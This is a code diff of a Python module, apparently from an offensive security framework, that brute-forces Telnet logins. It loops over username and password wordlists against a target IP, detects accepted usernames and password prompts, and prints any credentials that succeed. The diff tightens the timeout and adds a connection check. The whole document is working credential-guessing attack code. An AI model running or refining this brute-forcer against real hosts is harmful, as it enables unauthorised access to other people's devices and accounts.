@@ -23,8 +23,8 @@ SYM_FAILED = "🔒"
 
 REQUIRED_OPTIONS = {
     "IP": "",
-    "PASS": "fill with wordlist password",
     "USER": "fill with wordlist username",
+    "PASS": "fill with wordlist password",
 }
 
 
@@ -80,35 +80,32 @@ def execute(options, net):
         for password in passwords:
             con = None
             try:
-                con = net.Telnet(ip, port, timeout=10.0)
+                con = net.Telnet(ip, port, timeout=1.0)
+                if con.ok:
+                    # Kirim username, tunggu prompt password
+                    _, r = con.send(username, expected=promt_pass)
+                    if r < 0:
+                        # Username ditolak, tidak perlu lanjut ke password
+                        smf.printf(
+                            f"{CC.YELLOW}[*] Username: {username} {SYM_FAILED}{CC.RESET}"
+                        )
+                        break  # keluar dari loop
 
-                # Kirim username, tunggu prompt password
-                _, r = con.send(username, expected=promt_pass)
-                if r < 0:
-                    # Username ditolak, tidak perlu lanjut ke password
-                    smf.printf(
-                        f"{CC.YELLOW}[*] Username: {username} {SYM_FAILED}{CC.RESET}"
-                    )
-                    break  # keluar dari loop password, lanjut ke username berikutnya
+                    # Username diterima, kirim password
+                    _, r = con.send(password, expected=promt_shell)
+                    if r < 0:
+                        smf.printf(
+                            f"{CC.YELLOW}[*] U:{username} P:{password} {SYM_FAILED}{CC.RESET}"
+                        )
 
-                # Username diterima, kirim password
-                _, r = con.send(password, expected=promt_shell)
-                if r < 0:
-                    smf.printf(
-                        f"{CC.YELLOW}[*] U:{username} P:{password} {SYM_FAILED}{CC.RESET}"
-                    )
-
-                if r >= 0:
-                    # Berhasil login!
-                    smf.printf(
-                        f"{CC.GREEN}[✓] Bruteforce successful. U={username}:P={password} {SYM_SUCCESS}{CC.RESET}\n"
-                    )
-                    success = True
-                    return  # berhenti total
-
-                # Jika password salah, koneksi ditutup, lanjut ke password berikutnya
-                # (tidak perlu pesan setiap kali gagal)
-
+                    if r >= 0:
+                        # Berhasil login!
+                        smf.printf(
+                            f"{CC.GREEN}[✓] Bruteforce successful. U={username}:P={password} {SYM_SUCCESS}{CC.RESET}\n"
+                        )
+                        success = True
+                        return  # berhenti total
+                continue
             except KeyboardInterrupt:
                 smf.printf(f"\n{CC.YELLOW}[*] Bruteforce stopped.{CC.RESET}")
                 return
